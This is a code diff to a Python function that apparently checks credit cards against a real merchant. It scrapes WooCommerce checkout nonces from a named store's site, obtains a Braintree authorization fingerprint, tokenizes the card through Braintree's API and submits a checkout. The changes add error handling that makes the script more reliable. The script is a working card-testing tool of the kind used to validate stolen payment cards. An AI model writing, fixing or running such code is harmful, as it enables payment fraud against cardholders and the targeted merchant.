@@ -85,6 +85,9 @@ def check_nonsk2(card):
             wcal_guest_capture_nonce = extract_string(response.text, 'wcal_guest_capture_nonce" value="', '"')
             client_token_nonce = extract_string(response.text, 'client_token_nonce":"', '"')
 
+            if not checkout_nonce or not wcal_guest_capture_nonce or not client_token_nonce:
+                raise ValueError("Failed to retrieve necessary nonce values from the checkout page.")
+
             # Get client token
             url = "https://reinrespects.com/wp-admin/admin-ajax.php"
             data = {
@@ -92,7 +95,16 @@ def check_nonsk2(card):
                 "nonce": client_token_nonce
             }
             response = requests.post(url, headers=headers, data=data, cookies=cookies)
-            authorization_fingerprint = json.loads(base64.b64decode(extract_string(response.text, '{"success":true,"data":"', '"')))['authorizationFingerprint']
+            encoded_data = extract_string(response.text, '{"success":true,"data":"', '"')
+
+            if not encoded_data:
+                raise ValueError("Failed to retrieve encoded client token data.")
+
+            decoded_data = base64.b64decode(encoded_data).decode('utf-8')
+            authorization_fingerprint = json.loads(decoded_data).get('authorizationFingerprint')
+
+            if not authorization_fingerprint:
+                raise ValueError("Failed to retrieve authorization fingerprint.")
 
             # Tokenize credit card
             url = "https://payments.braintree-api.com/graphql"
@@ -124,7 +136,8 @@ def check_nonsk2(card):
                 "operationName": "TokenizeCreditCard"
             }
             response = requests.post(url, headers=headers, json=data, cookies=cookies)
-            token = response.json()['data']['tokenizeCreditCard']['token']
+            response_json = response.json()
+            token = response_json['data']['tokenizeCreditCard']['token']
 
             # Checkout
             url = "https://reinrespects.com/?wc-ajax=checkout"
